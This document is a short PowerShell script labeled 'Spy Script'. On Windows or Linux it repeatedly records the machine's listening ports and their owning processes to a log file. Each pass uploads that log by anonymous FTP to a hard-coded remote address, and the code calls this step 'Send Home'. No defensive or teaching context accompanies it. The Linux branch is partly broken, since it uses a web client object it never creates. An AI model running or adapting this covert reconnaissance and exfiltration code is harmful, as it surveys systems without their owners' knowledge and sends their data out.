#Powershell Spy Script

if ($IsWindows) {
#man LinRun loop. script will run every 2 min for 1 hr (x30):

#Start Site:

$ftp = "ftp://10.254.0.22/portdump/"
$username = "anon"
$password = ""
$localFile = ".\cracklins.log"
$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential($username, $password)

for ($cnt = 1; $cnt -le 30; $cnt++)

{

#Mark OS
Write-Host "Windows"

#Get Time For FileName:
Get-Date | Out-File -FilePath .\cracklins.log -Append

#Collect Open Ports:
get-nettcpconnection | where {($_.State -eq "Listen") -and ($_.RemoteAddress -eq "0.0.0.0")} | select LocalAddress,LocalPort,RemoteAddress,RemotePort,State,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | ft | Out-File -FilePath .\cracklins.log -Append

#Send Home:
$webclient.UploadFile($ftp, $localFile)

#2 min sleep
Start-Sleep 120

}
}

elseif ($IsLinux) {
#man LinRun loop. script will run every 2 min for 1 hr (x30):

#Send WebReq:

$ftp = "ftp://10.254.0.22/portdump/"
$username = "anon"
$password = ""
$localFile = ".\cracklins.log"
$credentials = New-Object System.Net.NetworkCredential($username, $password)
Invoke-WebRequest -Uri $ftp -Method Put -InFile $localFile -Credential $credentials

for ($cnt = 1; $cnt -le 30; $cnt++)

{

#Mark OS
Write-Host "Linux"

#Get Time For FileName:
Get-Date | Out-File -FilePath .\cracklins.log -Append

#Collect Open Ports:
netstat -an | Select-String "LISTENING" | Out-File -FilePath .\cracklins.log -Append

#Send Home:
$webclient.UploadFile($ftp,$localFile)

#2 min sleep
Start-Sleep 120

}
}
}
